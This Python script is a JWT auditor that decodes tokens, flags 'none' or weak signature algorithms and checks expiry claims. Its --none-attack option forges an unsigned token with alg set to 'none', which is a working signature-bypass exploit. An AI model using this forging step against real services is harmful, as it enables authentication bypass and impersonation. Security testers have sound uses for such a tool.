#!/usr/bin/env python3
"""
JWT Security Analyzer & Token Auditor
Author: Sameek Parajuli (https://github.com/Samik-Parajuli)
License: MIT
"""

import sys
import json
import base64
import time
import argparse
from datetime import datetime, timezone

def b64url_decode(payload):
    rem = len(payload) % 4
    if rem > 0:
        payload += '=' * (4 - rem)
    return base64.urlsafe_b64decode(payload.encode('utf-8')).decode('utf-8', errors='replace')

def b64url_encode(payload_bytes):
    return base64.urlsafe_b64encode(payload_bytes).decode('utf-8').rstrip('=')

def analyze_token(token, none_attack=False):
    parts = token.strip().split('.')
    if len(parts) < 2:
        print("[!] Error: Malformed JWT token (expected at least 2 dot-separated parts).", file=sys.stderr)
        return False

    header_raw, payload_raw = parts[0], parts[1]
    sig_raw = parts[2] if len(parts) > 2 else ""

    try:
        header = json.loads(b64url_decode(header_raw))
    except Exception as e:
        print(f"[!] Failed to parse Header JSON: {e}")
        header = {}

    try:
        payload = json.loads(b64url_decode(payload_raw))
    except Exception as e:
        print(f"[!] Failed to parse Payload JSON: {e}")
        payload = {}

    print("=" * 60)
    print(" [*] JWT SECURITY AUDITOR & CLAIMS INSPECTION")
    print("=" * 60)
    print("\n[+] HEADER (Algorithm & Parameters):")
    print(json.dumps(header, indent=2))
    print("\n[+] PAYLOAD (Data Claims):")
    print(json.dumps(payload, indent=2))
    print(f"\n[+] SIGNATURE: {sig_raw if sig_raw else '[EMPTY / STRIPPED]'}")

    # Security Audit
    print("\n" + "-" * 60)
    print(" [*] VULNERABILITY & INTEGRITY ASSESSMENT:")
    print("-" * 60)

    alg = str(header.get("alg", "")).lower()
    if alg == "none" or not alg:
        print("[CRITICAL] Algorithm set to 'none'! Signature bypass vulnerability (CVE-2015-9235).")
    elif alg == "hs256" and (not sig_raw or len(sig_raw) < 10):
        print("[CRITICAL] Empty or weak HMAC-SHA256 signature on signed token.")
    else:
        print(f"[PASS] Signature Algorithm: {header.get('alg', 'Unknown')}")

    now = int(time.time())
    if "exp" in payload:
        exp = payload["exp"]
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        if exp < now:
            print(f"[EXPIRED] Token expired at {exp_dt} ({now - exp} seconds ago).")
        else:
            print(f"[VALID] Token expires at {exp_dt} (in {exp - now} seconds).")

    if "nbf" in payload:
        nbf = payload["nbf"]
        if nbf > now:
            print(f"[NOT YET VALID] 'nbf' claim is in the future ({nbf - now}s remaining).")

    if none_attack:
        print("\n" + "=" * 60)
        print(" [*] GENERATING ALG: 'NONE' EXPLOIT PAYLOAD:")
        print("=" * 60)
        mod_header = dict(header)
        mod_header["alg"] = "none"
        new_h = b64url_encode(json.dumps(mod_header, separators=(',', ':')).encode('utf-8'))
        exploit_jwt = f"{new_h}.{payload_raw}."
        print(f"Exploit Token:\n{exploit_jwt}")

    return True

def main():
    parser = argparse.ArgumentParser(description="JWT Security Analyzer & Token Auditor")
    parser.add_argument("--token", "-t", help="JWT token string")
    parser.add_argument("--none-attack", action="store_true", help="Generate alg: 'none' signature bypass token")
    parser.add_argument("--sample", action="store_true", help="Audit built-in test sample")
    args = parser.parse_args()

    if args.sample:
        future = int(time.time()) + 86400 * 7
        h = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode('utf-8'))
        p = b64url_encode(json.dumps({"sub": "sameekey", "role": "security-auditor", "exp": future}).encode('utf-8'))
        s = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
        analyze_token(f"{h}.{p}.{s}", args.none_attack)
    elif args.token:
        analyze_token(args.token, args.none_attack)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
